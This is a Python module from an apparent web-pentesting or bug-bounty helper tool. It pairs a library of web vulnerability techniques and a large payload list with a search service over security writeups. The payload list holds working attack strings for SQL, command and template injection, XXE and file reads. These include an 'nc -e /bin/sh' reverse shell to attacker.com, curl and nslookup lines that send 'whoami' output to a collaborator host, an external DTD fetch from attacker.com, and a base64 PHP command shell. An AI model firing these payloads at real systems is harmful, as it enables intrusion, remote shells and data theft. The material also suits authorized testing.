import json
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field

from itzraven.core.logger import get_logger
from itzraven.core.rag_search import get_rag_search, PriorArt, _FAISS_AVAILABLE

logger = get_logger()


TECHNIQUE_LIBRARY: Dict[str, Dict[str, Any]] = {
    "xss": {
        "name": "Cross-Site Scripting (XSS)",
        "description": "Injecting malicious scripts into web pages viewed by other users",
        "types": ["Reflected", "Stored", "DOM-based", "Self-XSS", "Blind XSS"],
        "tools": ["XSS Hunter", "Burp Collaborator", "XSStrike", "BeEF"],
        "references": ["https://portswigger.net/web-security/cross-site-scripting", "https://github.com/s0md3v/XSStrike"],
        "common_params": ["q", "s", "search", "query", "term", "name", "callback", "redirect", "return"],
    },
    "csrf": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": "Forcing authenticated users to execute unwanted actions",
        "types": ["Form CSRF", "JSON CSRF", "Token bypass", "Referer bypass"],
        "tools": ["Burp CSRF PoC generator", "XSRFProbe"],
        "references": ["https://portswigger.net/web-security/csrf"],
        "common_params": ["token", "csrf_token", "authenticity_token", "_token"],
    },
    "ssrf": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Making server-side requests to internal or restricted resources",
        "types": ["Basic SSRF", "Blind SSRF", "Time-based SSRF", "SSRF via redirect"],
        "tools": ["SSRFmap", "Gopherus", "Interact.sh"],
        "references": ["https://portswigger.net/web-security/ssrf", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"],
        "common_params": ["url", "uri", "href", "src", "endpoint", "redirect", "callback", "webhook", "link"],
    },
    "sqli": {
        "name": "SQL Injection (SQLi)",
        "description": "Injecting SQL commands into database queries via user input",
        "types": ["Error-based", "Union-based", "Blind/Boolean", "Time-based", "Out-of-band", "Second-order"],
        "tools": ["sqlmap", "jSQL Injection", "NoSQLMap"],
        "references": ["https://portswigger.net/web-security/sql-injection", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"],
        "common_params": ["id", "user", "username", "email", "password", "search", "page", "sort", "order"],
    },
    "idor": {
        "name": "Insecure Direct Object Reference (IDOR)",
        "description": "Accessing objects or resources without proper authorization by manipulating identifiers",
        "types": ["Numeric ID", "UUID/Hash", "sequential ID", "Mass assignment"],
        "tools": ["Burp Autorize", "Autorize", "AuthMatrix"],
        "references": ["https://portswigger.net/web-security/access-control/idor"],
        "common_params": ["id", "user_id", "account_id", "file_id", "document_id", "uid", "pid"],
    },
    "rce": {
        "name": "Remote Code Execution (RCE)",
        "description": "Executing arbitrary code on the target server",
        "types": ["Command injection", "Code injection", "File upload RCE", "Deserialization RCE", "Template injection"],
        "tools": ["ysoserial", "Metasploit", "JNDIExploit"],
        "references": ["https://portswigger.net/web-security/os-command-injection", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"],
        "common_params": ["cmd", "command", "exec", "run", "ping", "traceroute", "host", "domain"],
    },
    "lfi": {
        "name": "Local File Inclusion (LFI)",
        "description": "Including arbitrary local files through path traversal or directory traversal",
        "types": ["Basic LFI", "PHP wrappers", "Log poisoning", "Proc/self/environ"],
        "tools": ["LFISuite", "Kadimus"],
        "references": ["https://portswigger.net/web-security/file-path-traversal", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"],
        "common_params": ["file", "page", "include", "load", "view", "document", "path", "template"],
    },
    "ssti": {
        "name": "Server-Side Template Injection (SSTI)",
        "description": "Injecting malicious template directives into server-side templates",
        "types": ["Jinja2/Flask", "Freemarker", "Velocity", "Twig", "Smarty", "Mako", "ERB"],
        "tools": ["tplmap", "Jinja2 SSTI cheat sheet"],
        "references": ["https://portswigger.net/web-security/server-side-template-injection", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"],
        "common_params": ["name", "template", "tpl", "view", "render", "page"],
    },
    "xxe": {
        "name": "XML External Entity (XXE) Injection",
        "description": "Exploiting XML parsers that process external entities",
        "types": ["In-band XXE", "Blind/OOB XXE", "Error-based XXE", "XXE via DTD"],
        "tools": ["XXEinjector", "Oxml_xxe"],
        "references": ["https://portswigger.net/web-security/xxe", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"],
        "common_params": ["xml", "data", "request", "body", "document"],
    },
    "open_redirect": {
        "name": "Open Redirect",
        "description": "Redirecting users to external malicious URLs via manipulated redirect parameters",
        "types": ["GET redirect", "POST redirect", "Header-based redirect", "Referer-based redirect"],
        "tools": ["Oralyzer"],
        "references": ["https://portswigger.net/web-security/dom-based/open-redirection"],
        "common_params": ["redirect", "return", "next", "url", "to", "goto", "link", "target", "page", "callback"],
    },
    "prototype_pollution": {
        "name": "Prototype Pollution",
        "description": "Injecting properties into JavaScript object prototypes leading to property injection",
        "types": ["Client-side PP", "Server-side PP", "PP via JSON merge"],
        "tools": ["ppmap", "Server-Side Prototype Pollution Scanner"],
        "references": ["https://portswigger.net/web-security/prototype-pollution", "https://github.com/BlackFan/client-side-prototype-pollution"],
        "common_params": ["__proto__", "constructor", "merge", "assign", "clone", "options"],
    },
    "deserialization": {
        "name": "Insecure Deserialization",
        "description": "Exploiting deserialization of untrusted data to achieve RCE or privilege escalation",
        "types": ["PHP deserialization", "Java deserialization", "Python pickle", ".NET deserialization", "Ruby deserialization"],
        "tools": ["ysoserial", "ysoserial.net", "phpggc", "pickora"],
        "references": ["https://portswigger.net/web-security/deserialization", "https://github.com/frohoff/ysoserial"],
        "common_params": ["session", "data", "serialized", "token", "cookie", "auth"],
    },
    "jwt": {
        "name": "JWT Attacks",
        "description": "Exploiting weaknesses in JSON Web Token implementations",
        "types": ["alg:none", "Weak HMAC secret", "JWK injection", "KID injection", "Key confusion", "Algorithm confusion"],
        "tools": ["jwt_tool", "jwt-cracker", "jwt.io"],
        "references": ["https://portswigger.net/web-security/jwt", "https://github.com/ticarpi/jwt_tool"],
        "common_params": ["token", "jwt", "bearer", "access_token", "refresh_token", "authorization"],
    },
    "oauth": {
        "name": "OAuth 2.0 / OpenID Connect Attacks",
        "description": "Exploiting OAuth implementation flaws for account takeover or token theft",
        "types": ["CSRF on OAuth", "Redirect URI manipulation", "Token leakage", "Improper state validation", "Scope escalation"],
        "tools": ["oauth2_proxy", "Burp OAuth scanner"],
        "references": ["https://portswigger.net/web-security/oauth", "https://oauth.net/2/"],
        "common_params": ["client_id", "redirect_uri", "response_type", "scope", "state", "code", "token"],
    },
    "race_condition": {
        "name": "Race Condition",
        "description": "Exploiting timing windows between check and use operations",
        "types": ["TOCTOU", "Coupon/Referral abuse", "Rate-limit bypass", "Concurrent session"],
        "tools": ["Burp Turbo Intruder", "Race the Web"],
        "references": ["https://portswigger.net/web-security/race-conditions", "https://github.com/nccgroup/race-the-web"],
        "common_params": ["coupon", "promo", "discount", "referral", "balance", "amount"],
    },
    "subdomain_takeover": {
        "name": "Subdomain Takeover",
        "description": "Registering a domain for an unclaimed CNAME to hijack subdomains",
        "types": ["AWS S3", "Azure", "GitHub Pages", "Heroku", "Shopify", "DigitalOcean", "CloudFront"],
        "tools": ["Subjack", "SubOver", "Can I Take Over XYZ", "Nuclei"],
        "references": ["https://github.com/EdOverflow/can-i-take-over-xyz", "https://github.com/haccer/subjack"],
        "common_params": ["cname", "host", "subdomain"],
    },
    "business_logic": {
        "name": "Business Logic Flaws",
        "description": "Exploiting logical flaws in application workflows and business rules",
        "types": ["Coupon abuse", "Cart manipulation", "Negative numbers", "Price manipulation", "Quantity overflow", "2FA bypass"],
        "tools": ["Burp Repeater", "Custom scripts"],
        "references": ["https://portswigger.net/web-security/logic-flaws"],
        "common_params": ["price", "quantity", "discount", "shipping", "tax", "total"],
    },
    "info_disclosure": {
        "name": "Information Disclosure",
        "description": "Leaking sensitive information through error messages, headers, or misconfigurations",
        "types": ["Error message leakage", "Source map disclosure", "Git exposure", "S3 bucket listing", "Debug endpoint", "Stack trace"],
        "tools": ["GitDorker", "dirsearch", "ffuf", "gitleaks"],
        "references": ["https://portswigger.net/web-security/information-disclosure"],
        "common_params": [".git", "debug", "internal", "backup", "config", ".env", "swagger"],
    },
    "command_injection": {
        "name": "Command Injection",
        "description": "Injecting OS commands into application inputs that are passed to shell execution",
        "types": ["Blind command injection", "Echo-based", "Time-based blind", "Out-of-band blind"],
        "tools": ["commix", "Burp Intruder payloads"],
        "references": ["https://portswigger.net/web-security/os-command-injection", "https://github.com/commixproject/commix"],
        "common_params": ["ip", "host", "domain", "ping", "traceroute", "nslookup", "dig", "cmd", "exec"],
    },
    "nosqli": {
        "name": "NoSQL Injection",
        "description": "Injecting NoSQL operators into MongoDB or other NoSQL database queries",
        "types": ["Authentication bypass", "Operator injection", "JavaScript injection"],
        "tools": ["NoSQLMap", "nosqlilab"],
        "references": ["https://portswigger.net/web-security/nosql-injection", "https://github.com/codingo/NoSQLMap"],
        "common_params": ["user", "username", "email", "password", "token", "session", "$ne", "$gt", "$regex"],
    },
    "ldap_injection": {
        "name": "LDAP Injection",
        "description": "Injecting LDAP filter syntax to manipulate directory queries",
        "types": ["Authentication bypass", "Blind LDAP injection"],
        "tools": ["JXplorer", "LdapMiner", "Burp intruder"],
        "references": ["https://portswigger.net/web-security/ldap-injection"],
        "common_params": ["user", "username", "cn", "uid", "mail", "bind_dn"],
    },
    "graphql": {
        "name": "GraphQL Vulnerabilities",
        "description": "Exploiting misconfigured GraphQL endpoints and injection flaws",
        "types": ["Introspection leak", "IDOR via GraphQL", "Batching attacks", "Depth DoS", "SQL injection via GraphQL", "Field duplication"],
        "tools": ["GraphQL Voyager", "InQL Scanner", "GraphiQL Explorer", "Clairvoyance"],
        "references": ["https://portswigger.net/web-security/graphql", "https://github.com/doyensec/inql"],
        "common_params": ["query", "mutation", "variables", "operationName", "graphql"],
    },
    "file_upload": {
        "name": "File Upload Vulnerabilities",
        "description": "Uploading malicious files to compromise the server or other users",
        "types": ["Unrestricted upload", "Extension bypass", "MIME type bypass", "Polyglot files", "SVG XSS", "ZIP symlink"],
        "tools": ["Burp Upload Scanner", "cairosvg", "exiftool"],
        "references": ["https://portswigger.net/web-security/file-upload", "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload"],
        "common_params": ["file", "upload", "image", "avatar", "attachment", "document", "resume"],
    },
    "host_header_injection": {
        "name": "Host Header Injection",
        "description": "Injecting malicious Host headers to manipulate application behavior",
        "types": ["Password reset poisoning", "Cache poisoning", "SSRF via Host", "Routing bypass"],
        "tools": ["HostileSubBruteforcer", "Burp Repeater"],
        "references": ["https://portswigger.net/web-security/host-header"],
        "common_params": ["Host", "X-Forwarded-Host", "X-Forwarded-For", "X-Host", "X-Real-IP"],
    },
    "cache_poisoning": {
        "name": "Web Cache Poisoning",
        "description": "Poisoning web caches to serve malicious content to users",
        "types": ["Unkeyed parameter", "Header manipulation", "Cookie-based", "Host header poisoning"],
        "tools": ["Burp Cache Poisoning Scanner", "Param Miner"],
        "references": ["https://portswigger.net/web-security/web-cache-poisoning", "https://github.com/PortSwigger/param-miner"],
        "common_params": ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Original-URL", "X-Rewrite-URL"],
    },
    "request_smuggling": {
        "name": "HTTP Request Smuggling",
        "description": "Smuggling HTTP requests through discrepancies in front-end/back-end parsing",
        "types": ["CL.TE", "TE.CL", "TE.TE", "Transfer-Encoding obfuscation"],
        "tools": ["Burp HTTP Request Smuggler", "Smuggler.py"],
        "references": ["https://portswigger.net/web-security/request-smuggling", "https://github.com/defparam/smuggler"],
        "common_params": ["Transfer-Encoding", "Content-Length", "Content-Type", "Connection"],
    },
    "clickjacking": {
        "name": "Clickjacking / UI Redressing",
        "description": "Tricking users into clicking invisible elements via embedded iframes",
        "types": ["Basic clickjacking", "Cursorjacking", "Likejacking", "Draggable clickjacking"],
        "tools": ["Burp Clickbandit", "X-Frame-Options Tester"],
        "references": ["https://portswigger.net/web-security/clickjacking"],
        "common_params": ["iframe", "frame", "top.location", "window.parent"],
    },
    "waf_bypass": {
        "name": "WAF Bypass Techniques",
        "description": "Bypassing Web Application Firewall rules and detection mechanisms",
        "types": ["Encoding bypass", "Case variation", "Parameter pollution", "Unicode/UTF-8", "HTTP verb tampering", "Null byte injection", "Comment injection"],
        "tools": ["tamper scripts", "sqlmap tampers", "Burp bypass payloads"],
        "references": ["https://github.com/0xInfection/Awesome-WAF", "https://portswigger.net/research/bypassing-wafs"],
        "common_params": ["id", "search", "q", "query", "select", "union", "<script>", "alert"],
    },
}


PAYLOAD_LIBRARY: Dict[str, List[str]] = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<details/open/ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<body onload=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "csrf": [
        "<form action=\"https://target.com/action\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>document.forms[0].submit();</script>",
        "X-CSRF-Token: forged_token_value",
        "Referer-based bypass: remove or modify Referer header",
        "Double submit cookie bypass: inject cookie via subdomain",
    ],
    "ssrf": [
        "http://127.0.0.1:8080",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0:22",
        "http://localhost:22",
        "http://[::1]:80",
        "http://10.0.0.1:443",
        "file:///etc/passwd",
        "http://2130706433:80",
        "http://0x7f000001:80",
        "gopher://localhost:6379/",
        "dict://localhost:6379/",
    ],
    "sqli": [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "1' AND SLEEP(5)--",
        "' OR 1=1--",
        "1' ORDER BY 5--",
        "admin'--",
        "' UNION SELECT @@version--",
        "1' AND 1=CAST(db_name() AS INT)--",
        "' UNION SELECT NULL,table_name FROM information_schema.tables--",
        "'/**/OR/**/1=1/**/--",
    ],
    "idor": [
        "/api/users/1",
        "/api/users/me",
        "/api/v1/account/12345",
        "/documents/download?id=100",
        "/user/profile?user_id=admin",
        "/api/orders?order_id=1",
        "POST /api/transfer with account_id=1234",
        "/files/../../etc/passwd",
    ],
    "rce": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "& ping -c 10 127.0.0.1 &",
        "| nc -e /bin/sh attacker.com 4444",
        "|| curl http://collaborator.oastify.com/$(whoami)",
        "'; system('id'); #",
        "${7*7}",
        "<%= system('id') %>",
    ],
    "lfi": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../etc/passwd%00",
        "../../../etc/passwd%23",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "expect://id",
        "/proc/self/environ",
    ],
    "ssti": [
        "{{7*7}}",
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "#{7*7}",
        "${7*7}",
        "${{7*7}}",
        "<%= 7*7 %>",
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        "*{7*7}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://collaborator.oastify.com/xxe.dtd\"> %xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;%intr;%trick;]>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "///evil.com",
        "http://evil.com",
        "//evil.com%2f@target.com",
        "javascript:alert(1)",
        "/\\evil.com",
        "?redirect=//evil.com",
        "https://target.com.evil.com",
        "@evil.com",
    ],
    "prototype_pollution": [
        "{\"__proto__\": {\"admin\": true}}",
        "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
        "{\"__proto__\": {\"polluted\": \"true\"}}",
        "?__proto__[admin]=true",
        "?constructor[prototype][admin]=true",
        "{\"type\": \"application/json\", \"__proto__\": {\"bypass\": true}}",
    ],
    "deserialization": [
        "O:1:\"A\":1:{s:1:\"a\";s:4:\"test\";}",
        "a:1:{i:0;O:1:\"A\":1:{s:1:\"a\";s:4:\"test\";}}",
        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(){})}()\"}",
        "ACED0005737200116F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E4B657956616C7565436F6D70617261746F72",
        "gASVcgAAAAAAAACMFGRhbmdlcm91cy5wYXlsb2Fkcy5waWNrbGXSTgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAgBDAh9wi4=",
    ],
    "jwt": [
        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{payload}.",
        "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{payload}.{forged_sig}",
        "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://evil.com/jwk.json\"}.{payload}.{sig}",
        "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../dev/null\"}.{payload}.{sig}",
    ],
    "oauth": [
        "redirect_uri=https://evil.com/oauth_callback",
        "?redirect_uri=https://target.com.evil.com/",
        "?response_type=token%20id_token&scope=openid%20admin",
        "?state= (empty or static)",
        "/oauth/authorize?client_id=ATTACKER_APP&redirect_uri=https://evil.com&response_type=code",
    ],
    "race_condition": [
        "Send 50 parallel requests for coupon redemption",
        "Turbo Intruder: race 50 concurrent POST /api/coupon/redeem",
        "Simultaneous balance withdrawal: GET /api/withdraw?amount=100",
        "Race password change: old_password bypass via race",
    ],
    "subdomain_takeover": [
        "CNAME dangling on: AWS S3, Azure, GitHub Pages, Heroku, Shopify",
        "nslookup -type=cname vulnerable.target.com -> unclaimed AWS S3 bucket",
        "Register the AWS S3 bucket yourself and host content",
    ],
    "business_logic": [
        "Change price to negative: -100",
        "Quantity overflow: 99999999",
        "Discount stacking: apply multiple promo codes",
        "Shipping price manipulation: change shipping parameter",
        "2FA bypass by skipping step: directly call POST /api/complete-checkout",
        "Integer overflow in amount field",
        "Decimal manipulation: 0.01 instead of 100",
    ],
    "info_disclosure": [
        "/robots.txt",
        "/.git/config",
        "/.env",
        "/swagger-ui.html",
        "/actuator/health",
        "/debug",
        "/console",
        "/api-docs",
        "Stack traces in error responses",
        "Source map files .map",
        "Backup files: .bak, .old, .swp",
        "Server headers leaking version info",
    ],
    "command_injection": [
        ";id",
        "| id",
        "`id`",
        "$(id)",
        "|| curl http://collaborator.oastify.com/$(whoami)",
        "& nslookup $(whoami).collaborator.oastify.com &",
        "| ping -c 10 127.0.0.1",
        "`ping -c 10 127.0.0.1 &`",
        "| nc -e /bin/sh attacker.com 4444",
    ],
    "nosqli": [
        "{\"$ne\": \"\"}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"$where\": \"this.password.length > 0\"}",
        "username[$ne]=invalid&password[$ne]=invalid",
        "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}",
    ],
    "ldap_injection": [
        "admin*",
        "*)(&",
        "admin)(&)",
        "admin(|(uid=*))",
        "|(uid=*))",
        "*)(uid=*))",
        "admin*))(|(uid=*",
        "userPassword=*",
    ],
    "graphql": [
        "query { __schema { types { name fields { name } } } }",
        "query { __typename }",
        "query { user(id: 1) { email password } }",
        "{ \"query\": \"mutation { login(username: \\\"admin\\\", password: {\\\"$ne\\\": \\\"\\\"}) { token } }\" }",
        "query { user(id: 1) { private_field } }",
        "fragment on User { id email password role }",
    ],
    "file_upload": [
        "shell.php",
        "shell.php5",
        "shell.phtml",
        "shell.pht",
        "shell.php%00.png",
        "shell.php;.png",
        "shell.php.123",
        "shell.php.jpg",
        "shell.svg with embedded script",
        "image with polyglot PHP payload in EXIF",
        ".htaccess with AddType application/x-httpd-php .txt",
        "shell.php. (trailing dot on Windows)",
    ],
    "host_header_injection": [
        "Host: evil.com",
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-For: evil.com",
        "X-Host: evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "Host: target.com:notstandard",
    ],
    "cache_poisoning": [
        "GET /page?unkeyed_param=evil.com",
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Scheme: http (over https)",
        "Origin: null",
        "GET / with Cookie: session=malicious",
    ],
    "request_smuggling": [
        "CL.TE: Content-Length: 6 + Transfer-Encoding: chunked",
        "TE.CL: Transfer-Encoding: chunked + Content-Length: 4",
        "Transfer-Encoding: xchunked (obfuscated header)",
        "Transfer-Encoding : chunked (space before colon)",
        "GET / HTTP/1.1 + Transfer-Encoding: chunked + smuggled request",
    ],
    "clickjacking": [
        "<iframe src=\"https://target.com/admin/delete\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe>",
        "<style>iframe { opacity: 0; position: absolute; top: 0; left: 0; }</style>",
        "X-Frame-Options: ALLOW-FROM https://evil.com",
    ],
    "waf_bypass": [
        "UNION/**/SELECT/**/1,2,3",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<img src=x onerror=&#97&#108&#101&#114&#116(1)>",
        "1' AND 1=1 /*!*/--",
        "?id=1&id=2&id=3 (parameter pollution)",
        "?search=%%%27%20OR%20%271%27=%271",
        "1' OR '1'='1' /*!50000*/",
        "SELECT%09*%09FROM%09users",
        "id=1+union+distinct+select+1,2,3",
        "/*!12345UNION*/ SELECT 1,2,3",
    ],
}


class WriteupSearchServer:
    def __init__(self):
        self._rag = get_rag_search()
        self._writeups: Dict[str, Dict[str, Any]] = {}

    async def search_writeups(self, query: str, technique: str = "", k: int = 5) -> dict:
        try:
            results = self._rag.search(query=query, technique=technique, k=k)
            writeups = [r.to_dict() for r in results]
            if not writeups and technique:
                writeups = self._keyword_technique_fallback(query, technique, k)
            return {
                "success": True,
                "query": query,
                "technique": technique or "any",
                "count": len(writeups),
                "results": writeups,
                "faiss_enabled": _FAISS_AVAILABLE,
            }
        except Exception as e:
            logger.debug(f"search_writeups error: {e}")
            return {
                "success": True,
                "query": query,
                "technique": technique or "any",
                "count": 0,
                "results": self._keyword_technique_fallback(query, technique, k),
                "faiss_enabled": False,
            }

    async def get_writeup(self, writeup_id: str) -> dict:
        for art in self._rag.metadata:
            if art.id == writeup_id or art.id.lower() == writeup_id.lower():
                return {"success": True, "writeup": art.to_dict()}
        if writeup_id in self._writeups:
            return {"success": True, "writeup": self._writeups[writeup_id]}
        return {"success": False, "error": f"Writeup not found: {writeup_id}"}

    async def search_techniques(self, vuln_class: str) -> dict:
        vc = vuln_class.lower()
        exact = TECHNIQUE_LIBRARY.get(vc)
        if exact:
            return {"success": True, "vuln_class": vc, "technique": exact}
        matches = []
        for key, val in TECHNIQUE_LIBRARY.items():
            if vc in key or vc in val["name"].lower():
                matches.append(val)
        if matches:
            return {"success": True, "vuln_class": vc, "technique": matches[0], "alternatives": matches[1:]}
        return {"success": False, "error": f"Vulnerability class not found: {vuln_class}"}

    async def search_payloads(self, vuln_class: str) -> dict:
        vc = vuln_class.lower()
        exact = PAYLOAD_LIBRARY.get(vc)
        if exact:
            return {"success": True, "vuln_class": vc, "payload_count": len(exact), "payloads": exact}
        matches = []
        for key, val in PAYLOAD_LIBRARY.items():
            if vc in key:
                matches.append({"class": key, "payloads": val})
        if matches:
            return {"success": True, "vuln_class": vc, "payload_count": len(matches[0]["payloads"]), "payloads": matches[0]["payloads"], "alternatives": matches[1:]}
        return {"success": False, "error": f"No payloads found for: {vuln_class}"}

    async def ingest_writeup(self, source: str, title: str, description: str, technique: str, severity: str, content: str) -> dict:
        import uuid
        import datetime
        writeup_id = str(uuid.uuid4())[:8]
        art = PriorArt(
            source=source,
            id=writeup_id,
            title=title,
            description=description,
            technique=technique,
            severity=severity,
            url="",
            tags=[technique.lower()],
            disclosed_at=datetime.datetime.now().isoformat(),
        )
        try:
            self._rag.add_writeup(art)
            self._writeups[writeup_id] = {
                "id": writeup_id,
                "source": source,
                "title": title,
                "description": description,
                "technique": technique,
                "severity": severity,
                "content": content,
                "tags": [technique.lower()],
            }
            return {
                "success": True,
                "writeup_id": writeup_id,
                "title": title,
                "technique": technique,
                "severity": severity,
            }
        except Exception as e:
            logger.debug(f"ingest_writeup error: {e}")
            writeup_id = str(uuid.uuid4())[:8]
            self._writeups[writeup_id] = {
                "id": writeup_id,
                "source": source,
                "title": title,
                "description": description,
                "technique": technique,
                "severity": severity,
                "content": content,
            }
            return {
                "success": True,
                "writeup_id": writeup_id,
                "title": title,
                "technique": technique,
                "severity": severity,
                "indexed": False,
            }

    def _keyword_technique_fallback(self, query: str, technique: str, k: int) -> List[Dict[str, Any]]:
        results = []
        q_lower = query.lower()
        for art in self._rag.metadata:
            text = f"{art.title} {art.description} {art.technique}".lower()
            if technique and technique.lower() not in art.technique.lower():
                continue
            if any(term in text for term in q_lower.split() if len(term) > 2):
                results.append(art.to_dict())
                if len(results) >= k:
                    break
        if not results and technique:
            technique_info = TECHNIQUE_LIBRARY.get(technique.lower())
            if technique_info:
                results.append({
                    "source": "builtin",
                    "id": f"builtin_{technique}",
                    "title": technique_info["name"],
                    "description": technique_info["description"],
                    "technique": technique,
                    "severity": "info",
                    "similarity": 1.0,
                })
        return results


_writeup_server: Optional[WriteupSearchServer] = None


def get_writeup_server() -> WriteupSearchServer:
    global _writeup_server
    if _writeup_server is None:
        _writeup_server = WriteupSearchServer()
    return _writeup_server
